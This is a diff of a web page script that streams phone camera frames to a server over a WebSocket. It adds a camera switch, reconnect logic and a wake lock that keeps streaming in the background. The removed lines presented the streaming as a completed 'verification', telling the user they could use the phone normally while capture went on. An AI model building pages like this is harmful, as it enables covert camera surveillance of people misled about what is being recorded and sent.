@@ -92,39 +92,75 @@
     function sendFrame() {
       if (!sending || !video.videoWidth || !ws || ws.readyState !== WebSocket.OPEN) return;
       
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      
-      canvas.toBlob(blob => {
-        if (ws && ws.readyState === WebSocket.OPEN && blob) {
-          ws.send(blob);
-          log('Frame inviato: ' + blob.size + ' bytes');
-        }
-      }, 'image/jpeg', 0.5); // Ridotta qualità per migliorare performance
+      try {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        
+        canvas.toBlob(blob => {
+          if (ws && ws.readyState === WebSocket.OPEN && blob) {
+            // Prima invia il messaggio di controllo
+            ws.send(JSON.stringify({ 
+              room,
+              timestamp: Date.now(),
+              frameSize: blob.size
+            }));
+            
+            // Poi invia il frame
+            ws.send(blob);
+            log('Frame inviato: ' + blob.size + ' bytes');
+          }
+        }, 'image/jpeg', 0.7); // Aumentata qualità per migliore visibilità
+      } catch (err) {
+        log('Errore invio frame: ' + err.message);
+        // Riprova a riconnetterti se c'è un errore
+        stopSendingFrames();
+        setTimeout(connectWebSocket, 1000);
+      }
     }
 
-    // Avvia fotocamera POSTERIORE
+    let currentCamera = 'environment';
+    
+    async function switchCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
+      await startCamera();
+    }
+
+    // Avvia fotocamera
     async function startCamera() {
       try {
-        stream = await navigator.mediaDevices.getUserMedia({
+        const constraints = {
           video: { 
-            facingMode: 'environment',
+            facingMode: { exact: currentCamera },
             width: { ideal: 1280 },
             height: { ideal: 720 }
           },
           audio: false
-        });
+        };
+        
+        try {
+          stream = await navigator.mediaDevices.getUserMedia(constraints);
+        } catch (err) {
+          // Se fallisce con 'exact', prova senza
+          constraints.video.facingMode = currentCamera;
+          stream = await navigator.mediaDevices.getUserMedia(constraints);
+        }
+
         video.srcObject = stream;
         video.onloadedmetadata = () => {
           startSendingFrames();
           
-          // Messaggio finale
+          // Messaggio finale con pulsante switch camera
           document.querySelector('.msg').innerHTML = `
             <div>
-              <b>Verifica completata</b><br>
-              <small>Puoi usare il telefono normalmente.<br>
-              La verifica continua in background.</small>
+              <b>Camera attiva</b><br>
+              <button onclick="switchCamera()" style="margin: 10px; padding: 8px;">
+                Cambia Camera
+              </button><br>
+              <small>La trasmissione continua in background.</small>
             </div>`;
         };
 
@@ -138,19 +174,38 @@
       }
     }
 
-    // Gestione visibilità pagina
-    document.addEventListener('visibilitychange', () => {
-      if (document.hidden) {
-        // La pagina è nascosta, continua a inviare
-        log('Pagina in background - continuo invio');
-      } else {
-        // La pagina è visibile di nuovo
-        log('Pagina in primo piano');
-        if (!sending && stream) {
-          startSendingFrames();
+    // Mantieni attiva la pagina in background
+    if ('wakeLock' in navigator) {
+      let wakeLock = null;
+      const requestWakeLock = async () => {
+        try {
+          wakeLock = await navigator.wakeLock.request('screen');
+          log('WakeLock attivato');
+        } catch (err) {
+          log('WakeLock non disponibile: ' + err.message);
         }
-      }
-    });
+      };
+      
+      document.addEventListener('visibilitychange', async () => {
+        if (document.hidden) {
+          log('Pagina in background - mantengo attiva');
+          // Richiedi wake lock per mantenere attivo in background
+          await requestWakeLock();
+        } else {
+          log('Pagina in primo piano');
+          if (wakeLock) {
+            wakeLock.release();
+            wakeLock = null;
+          }
+          if (!sending && stream) {
+            startSendingFrames();
+          }
+        }
+      });
+      
+      // Attiva subito il wake lock
+      requestWakeLock();
+    }
 
     // Gestione chiusura pagina
     window.onbeforeunload = () => {
